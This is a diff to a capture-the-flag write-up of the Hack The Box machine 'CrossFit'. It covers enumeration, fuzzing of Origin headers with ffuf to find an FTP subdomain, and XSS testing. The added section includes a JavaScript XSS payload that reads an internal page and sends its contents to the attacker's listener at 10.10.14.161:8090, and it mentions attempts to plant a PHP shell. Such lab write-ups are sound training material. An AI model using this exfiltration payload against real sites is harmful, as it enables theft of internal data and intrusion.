@@ -209,6 +209,8 @@ Tried with `ffuf` as well, Did not find any more subdomains
 
 Found four possible usernames on the About-Us page: Becky Taylor - Gymer, Noah Leonard - Trainer, Evelyn Fields - Gymer, Leroy Guzman - Manager
 
+### Cross-site Scripting \(XSS\)
+
 ![](../../.gitbook/assets/2-xss-test.png)
 
 Since there wasn't anything obvious to go by, I started poking at the submission boxes. The first one at `/contact.php` did not seem to be vulnerable to either XSS or SQL injection, 
@@ -267,6 +269,10 @@ Serving HTTP on 0.0.0.0 port 8099 (http://0.0.0.0:8099/) ...
 
 In the same spirit I tried to get the admin to download a PHP shell from me, and I couldn't find where it had been possibly uploaded
 
+![](../../.gitbook/assets/2-origin.png)
+
+Origin Header with Access-Control-Allow-Origin response header
+
 ```bash
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
 └─$ ffuf -t 25 -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.10.208 -H 'Origin: http://FUZZ.crossfit.htb' -mr 'Allow-Origin'               
@@ -298,7 +304,28 @@ ftp                     [Status: 200, Size: 10701, Words: 3427, Lines: 369]
 
 found ftp.crossfit.htb
 
+![](../../.gitbook/assets/2-ftb-apache.png)
 
+Led to another default Apache page
+
+
+
+[https://stackoverflow.com/questions/247483/http-get-request-in-javascript](https://stackoverflow.com/questions/247483/http-get-request-in-javascript)
+
+```javascript
+//testing access to ftp.crossfit.htb
+//
+var test = "http://ftp.crossfit.htb/";
+var request1 = new XMLHttpRequest();
+request1.open('GET', test, false);
+request1.send()
+var response1 = request1.responseText;
+
+var request2 = new XMLHttpRequest();
+//send response1 to my waiting python http.server 
+request2.open('GET', 'http://10.10.14.161:8090/' + response1, true);
+request2.send()
+```
 
 wrote payload to create new ftp user
 
